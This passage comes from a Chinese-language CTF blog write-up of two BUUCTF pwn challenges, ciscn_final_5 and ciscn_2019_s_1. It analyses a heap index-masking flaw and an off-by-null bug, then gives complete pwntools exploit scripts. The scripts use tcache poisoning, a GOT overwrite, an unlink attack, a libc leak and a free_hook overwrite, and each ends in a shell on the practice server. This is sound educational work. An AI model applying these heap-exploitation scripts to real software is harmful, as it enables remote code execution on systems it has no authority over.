Out[<span class="hljs-number">3</span>]: <span class="hljs-string">'0xe35281'</span></code></pre></div>

<p>差不多就是这样，但是也可以发现点异样。因为是<code>|</code> 的逻辑运算，在<code>0-0xf</code>是一个轮回后，到了16就又算是一个轮回。<br>既然处理过堆地址，那肯定取出来进行操作时，肯定还会再进行处理回来。下面就是注意怎么处理的。</p>
<h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">16</span>; ++i )
 &#123;
   result = get_idx(heaplist_idx[i]);
   <span class="hljs-keyword">if</span> ( result == idx )
   &#123;
     <span class="hljs-built_in">printf</span>(<span class="hljs-string">"content: "</span>);
     read_diy((<span class="hljs-keyword">void</span> *)(heaplist_idx[i] &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF0</span>LL), sizelist[i]);
     result = <span class="hljs-built_in">puts</span>(<span class="hljs-string">"edit success.\n"</span>);
     <span class="hljs-keyword">break</span>;
   &#125;
 &#125;</code></pre></div>

<div class="hljs"><pre><code class="hljs c">__int64 __<span class="hljs-function">fastcall <span class="hljs-title">get_idx</span><span class="hljs-params">(<span class="hljs-keyword">char</span> a1)</span>
</span>&#123;
  <span class="hljs-keyword">return</span> a1 &amp; <span class="hljs-number">0xF</span>;
&#125;</code></pre></div>

<p>可以看到其是依次0-17编号对堆块进行遍历取出，再取出时会对其进行<code>&amp; 0xf</code>的操作来尝试获取堆块的编号。</p>
<p>来测试一下：</p>
<div class="hljs"><pre><code class="hljs c">
In [5]: hex(0x00e35281 &amp; 0xf). #1号堆块的计算
Out[5]: '0x1'

In [6]: hex(0x00e35270 &amp; 0xf) #16号堆块的计算
Out[6]: '0x0'</code></pre></div>

<p>这就很明显有异样了，申请的是16号堆块其认为是0号堆块。所以申请16号的堆块，其可以用edit（0）来进行编辑16号堆块。</p>
<p>然后看其如何编辑的：</p>
<div class="hljs"><pre><code class="hljs c">read_diy((<span class="hljs-keyword">void</span> *)(heaplist_idx[i] &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF0</span>LL), sizelist[i]);</code></pre></div>

<p>其是根据bss上存的处理过堆块地址进行一下<code>&amp; 0xFFFFFFFFFFFFFFF0</code> 来进行编辑的。<br>对于上来就申请了一个16号的堆块，很容易知道其堆块的末3为应该是0x260，但是当时存入的是0x270，尝试进行一下<code>&amp; 0xFFFFFFFFFFFFFFF0</code>：</p>
<div class="hljs"><pre><code class="hljs undefined">In [<span class="hljs-number">7</span>]: hex(<span class="hljs-number">0x00e35270</span> &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF0</span>)
Out[<span class="hljs-number">7</span>]: <span class="hljs-string">'0xe35270'</span></code></pre></div>

<p>发现并不是从0x260进行编辑，但是同样还是可以编辑同样的size，所以这就造成了溢出，并且是0x10个字节。</p>
<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><ul>
<li>释放2个tcache 堆块，并且利用0x10字节，改其中一个堆块的fd，改为free的got位置</li>
<li>申请堆块到free got处，改free 为 puts</li>
<li>构造出一个unsortbin的堆块，然后再申请一个堆块，就会在这个堆块上留下部分的libc地址，然后进行leak</li>
<li>算出system的地址，继续改free got 处为 system，然后free一个带有<code>/bin/sh\x00</code>的堆块，即可拿到shell</li>
</ul>
<h3 id="exp-24"><a href="#exp-24" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./ciscn_final_5'</span>
elf = ELF(local_file)
<span class="hljs-comment"># context.log_level = 'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = elf.libc
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27180</span>)
    libc = elf.libc
    <span class="hljs-comment">#libc = ELF('.')</span>
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
<span class="hljs-comment">#,''splitw','-h'</span>
rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]
rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]
realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]
arae18 = <span class="hljs-number">0x3ebca0</span>
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>
    sla(<span class="hljs-string">'choice:'</span>,<span class="hljs-string">'1'</span>)
    sla(<span class="hljs-string">'dex'</span>,str(idx))
    sla(<span class="hljs-string">'size'</span>,str(size))
    sa(<span class="hljs-string">'content'</span>,str(data))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>
    sla(<span class="hljs-string">'choice:'</span>,<span class="hljs-string">'2'</span>)
    sla(<span class="hljs-string">'dex'</span>,str(idx))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>
    sla(<span class="hljs-string">'choice:'</span>,<span class="hljs-string">'3'</span>)
    sla(<span class="hljs-string">'dex'</span>,str(idx))
    sa(<span class="hljs-string">'content'</span>,str(data))


add(<span class="hljs-number">16</span>,<span class="hljs-number">0x18</span>,<span class="hljs-string">'sasdasdas'</span>)
add(<span class="hljs-number">1</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">'aaaaaaaa'</span>)
add(<span class="hljs-number">2</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">'aaaaaaaa'</span>)
free(<span class="hljs-number">2</span>)
free(<span class="hljs-number">1</span>)
edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x121</span>) + p64(<span class="hljs-number">0x000000000602010</span>))
add(<span class="hljs-number">5</span>,<span class="hljs-number">0x800</span>,<span class="hljs-string">'aaaaaaaa'</span>)
add(<span class="hljs-number">6</span>,<span class="hljs-number">0x50</span>,<span class="hljs-string">'aaaa'</span>)
add(<span class="hljs-number">3</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">' '</span>)
free(<span class="hljs-number">5</span>)
add(<span class="hljs-number">7</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">' '</span>)
add(<span class="hljs-number">4</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">'aaaaaaaa'</span> + p64(elf.plt[<span class="hljs-string">'puts'</span>]))
free(<span class="hljs-number">7</span>)
r()
libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ec120</span>
info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)
edit(<span class="hljs-number">4</span>,<span class="hljs-string">'aaaaaaaa'</span> + p64(libc.sym[<span class="hljs-string">'system'</span>] + libc_base))
add(<span class="hljs-number">9</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">'/bin/sh\x00'</span>)
free(<span class="hljs-number">9</span>)
itr()</code></pre></div>

<p>由于其确定堆块的特殊性，在申请堆块到free got时，因为其在<code>0x000000000602018</code>，但是在经过逻辑运算处理后，放入bss后，想要再进行操作就有点困难，所以申请到<code>0x000000000602010</code> 就OK了。</p>
<h2 id="ciscn-2019-s-1"><a href="#ciscn-2019-s-1" class="headerlink" title="ciscn_2019_s_1"></a><code>ciscn_2019_s_1</code></h2><h3 id="分析-23"><a href="#分析-23" class="headerlink" title="分析"></a>分析</h3><p>保护：</p>
<div class="hljs"><pre><code class="hljs undefined"><span class="hljs-string">[*]</span> <span class="hljs-string">'/ctf/work/buuctf/shuati/ciscn_2019_s_1/ciscn_s_1'</span>
<span class="hljs-attr">    Arch:</span>     <span class="hljs-string">amd64-64-little</span>
<span class="hljs-attr">    RELRO:</span>    <span class="hljs-string">Full</span> <span class="hljs-string">RELRO</span>
<span class="hljs-attr">    Stack:</span>    <span class="hljs-string">Canary</span> <span class="hljs-string">found</span>
<span class="hljs-attr">    NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span>
<span class="hljs-attr">    PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span></code></pre></div>

<p>Add函数：最多可以申请33个堆，且问你堆的编号，并且根据这个编号作为索引上bss段来存储heap的地址。大小范围在<code>0x7f - 0x100</code>。</p>
<p>edit函数：</p>
<div class="hljs"><pre><code class="hljs c">v0[read(<span class="hljs-number">0</span>, (<span class="hljs-keyword">void</span> *)heap[v2], (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)len[v2])] = <span class="hljs-number">0</span>;</code></pre></div>

<p>明显存在着off by null。且有key1控制着，只能编辑2次。</p>
<div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( key1 == <span class="hljs-number">2</span> )
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</code></pre></div>

<p>Show函数：<br>Key2有值才能用。</p>
<h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><ul>
<li>由于没有开启pie保护，这样明显可以unlink攻击，申请一个32堆号的堆，大小0xf8，都是越大越好，为了上靠近key1、key2，然后进行控制.</li>
</ul>
<p>剩下的就很简单了。</p>
<h3 id="exp-25"><a href="#exp-25" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs c">from pwn import *
import time
local_file  = './ciscn_s_1'
elf = ELF(local_file)
context.log_level = 'debug'
debug = 0
if debug:
    io = process(local_file)
    libc = elf.libc
else:
    io = remote('node3.buuoj.cn',29756)
    libc = elf.libc
    #libc = ELF('.')
context.arch = elf.arch
context.terminal = ['tmux','neww']
#,''splitw','-h'
rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
rce18 = [0x4f2c5,0x4f322,0x10a38c]
realloc = [0x2,0x4,0x6,0xB,0xC,0xD]
arae18 = 0x3ebca0
s      = lambda data               :io.send(data) 
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
r      = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr))
itr     = lambda                    :io.interactive()
def debug():
    # gdb.attach(proc.pidof(io)[0],gdbscript='b main')
    gdb.attach(io)
    pause()
def add(idx,size,data):
    sla('show\n','1')
    sla('dex',str(idx))
    sla('size',str(size))
    sa('content',str(data))
def free(idx):
    sla('show\n','2')
    sla('dex',str(idx))
def edit(idx,data):
    sla('show\n','3')
    sla('dex',str(idx))
    sa('content',str(data))

def show(idx):
    sla('show\n','4')
    sla('dex',str(idx))
key2 = 0x6022B8

for i in range(7):
    add(i,0xf8,'aaaaaaaa')

add(7,0xf8,"aaaa")#8
payload = p64(0) + p64(0x32) + p64(0x6021e0 - 0x18) + p64(0x6021e0 - 0x10) + p64(0) * 2 + p64(0x30)
add(32,0xf8,payload)#32
add(8,0x88,"aaaa")
add(9,0xf8,"aaaa")
add(10,0x88,'aaaa')

for i in range(7):
    free(i+1) # 由于32的堆块申请后破坏了0号堆块的在bss上地址的储存
payload = 'a' * 0x80 + p64(0x180)
edit(8,payload)
free(9)
payload = p64(0) * 3 + p64(0x00000000006021c8) + '\x00'  * (0xf0 - 0x8 * 4) + p64(0x0000000400000001)
edit(32,payload)
add(11,0x88,' ')
show(11)
r()
libc_base = uu64(r(6)) - 0x3ebf20
info_addr('libc_base',libc_base)

free_hook = libc_base + 0x3ed8e8
rec = rce18[1] + libc_base
payload = p64(0) * 3 + p64(free_hook)
edit(32,payload)
edit(32,p64(rec))
free(11)
itr()</code></pre></div>


            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2020/07/25/DASCTF安恒月赛(7th)/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">DASCTF安恒月赛(7th)</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2020/06/28/“第五空间” 智能安全大赛/">
                        <span class="hidden-mobile">“第五空间” 智能安全大赛-twice</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- LeanCloud 统计PV -->
        <span id="leancloud-site-pv-container" style="display: none">
            总访问量 
            <span id="leancloud-site-pv"></span>
             次
          </span>
      
      
        <!-- LeanCloud 统计UV -->
        <span id="leancloud-site-uv-container" style="display: none">
            总访客数 
            <span id="leancloud-site-uv"></span>
             人
          </span>
      

    
  </div>


  

  
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/main.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
  <script  src="/js/clipboard-use.js" ></script>







  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "BUUCTF暑假刷题(1)&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "left",
      visible: "hover",
      
      icon: "#"
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>












  

  

  

  

  

  





</body>
</html>
